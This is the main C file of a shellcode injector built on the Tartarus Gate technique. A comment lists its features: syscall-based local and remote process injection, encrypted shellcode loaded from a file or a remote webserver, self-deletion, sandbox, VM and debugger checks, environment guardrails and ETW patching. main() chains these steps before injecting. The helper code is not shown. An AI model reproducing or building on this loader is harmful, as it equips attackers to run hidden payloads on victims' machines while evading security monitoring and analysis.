#include "structs.h"
#include "main.h"

/*
Simple shellcode injector, based on the Tartarus Gate technique
Features:
- Make use of hashed function names                                    -> DONE
- Local and Remote process injection                                   -> DONE
- Support direct and indirect syscalls                                 -> DONE
- Default implementation based on the classic injection technique      -> DONE
- Reading the shellcode from a local file or remote webserver          -> DONE
- Using encrypted(RC4) shellcode with a hardcoded XoRed key            -> DONE
- Self delete the resulting binary after run (switchable)              -> DONE
- Basic sandbox/VM checks along with a delayed exec                    -> DONE
- Debugger detection                                                   -> DONE
- Targeting process by name                                            -> DONE
- Additional mapping injection support                                 -> DONE
- Basic guardrails, based on username, userdomain, computername        -> DONE
- ETW evasion trough patching the EtwpEventWriteFull func              -> DONE


Fixes and Improvements:
- Do not hardcode the XoR key, maybe concatenated with the payload ?
- Remove all WIN apis that are being used
- Remove the need for CRT library
- Remove the need for LoadLibraryA
*/

//Initialize global variables
NTCONF g_NtConfig = { 0 };
SC_FUNC g_Fun = { 0 };
ENV envVars = { 0 };


int main()
{
    //Initialize syscalls
    if (!InitSyscls()) {
        DEBUG_PRINT("[!] Failed to initialize syscalls\n");
        return 1;
    }

    //Get environment variables
    if (!GetEnv(&envVars)) {
        DEBUG_PRINT("[!] Failed to determine environment\n");
        return 1;
    }

    //Apply guardrails if defined
#ifdef GUARDRAILS
    if (!GuardRails()) {
        DeleteSelf();
        return 1;
    }
#endif

#ifdef PATCH_ETW
    PatchETW();
#endif

    //If true possible sandbox detected, either wait or quit
    //If less than 40 running processes, possbile sandbox
    DWORD pCount = GetProcesses(NULL, NULL);
    if (CheckResources() || CheckName() || IsDebugged() || pCount < 30) {
#ifdef WAIT
        FLOAT w_for = WAIT;
        if (!Delay(w_for)) {
            DeleteSelf();
            return 1;
        }
#elif !defined(WAIT)
        DeleteSelf();
        return 1;
#endif
    }



#ifdef SELF_DELETE
    //Self delete the binary after run
    DeleteSelf();
#endif


    //Run the injection defined
#ifdef MAPPING_INJECTION
    if (!RunMap()) {
        return 1;
    }

#elif !defined(MAPPING_INJECTION)
    if (!RunClassic()) {
        return 1;
    }
#endif

    return 0;
}
